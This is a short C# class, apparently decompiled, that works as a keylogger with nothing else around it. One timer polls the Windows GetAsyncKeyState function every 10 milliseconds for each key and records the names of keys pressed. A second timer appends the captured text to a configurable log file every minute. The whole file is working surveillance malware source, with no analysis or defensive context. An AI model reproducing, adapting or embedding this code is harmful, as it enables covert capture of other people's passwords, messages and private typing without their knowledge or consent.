using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;

public sealed class GClass0
{
	private string string_0;

	private Timer timer_0;

	private Timer timer_1;

	private string string_1;

	public GClass0(string string_2)
	{
		string_0 = string.Empty;
		method_7(string_2);
		timer_0 = new Timer();
		timer_0.Enabled = true;
		timer_0.Elapsed += timer_0_Elapsed;
		timer_0.Interval = 10.0;
		timer_1 = new Timer();
		timer_1.Enabled = true;
		timer_1.Elapsed += timer_1_Elapsed;
		timer_1.Interval = 60000.0;
	}

	[DllImport("user32.dll")]
	private static extern short GetAsyncKeyState(Keys keys_0);

	[DllImport("user32.dll", EntryPoint = "GetAsyncKeyState")]
	private static extern short GetAsyncKeyState_1(int int_0);

	public bool method_0()
	{
		if (timer_0.Enabled)
		{
			return timer_1.Enabled;
		}
		return false;
	}

	public void method_1(bool bool_0)
	{
		timer_0.Enabled = bool_0;
		timer_1.Enabled = bool_0;
	}

	public double method_2()
	{
		return timer_1.Interval;
	}

	public void method_3(double double_0)
	{
		timer_1.Interval = double_0;
	}

	public double method_4()
	{
		return timer_0.Interval;
	}

	public void method_5(double double_0)
	{
		timer_0.Interval = double_0;
	}

	public string method_6()
	{
		return string_1;
	}

	public void method_7(string string_2)
	{
		string_1 = string_2;
	}

	private void timer_0_Elapsed(object sender, ElapsedEventArgs e)
	{
		foreach (int value in Enum.GetValues(typeof(Keys)))
		{
			if (GetAsyncKeyState_1(value) == -32767)
			{
				string_0 = string_0 + Enum.GetName(typeof(Keys), value) + " ";
			}
		}
	}

	private void timer_1_Elapsed(object sender, ElapsedEventArgs e)
	{
		method_8(string_1, bool_0: true);
	}

	public void method_8(string string_2, bool bool_0)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(string_2, bool_0);
			streamWriter.WriteLine(string_0 + "\r\n");
			streamWriter.Close();
			string_0 = string.Empty;
		}
		catch (Exception ex)
		{
			throw ex;
		}
	}
}
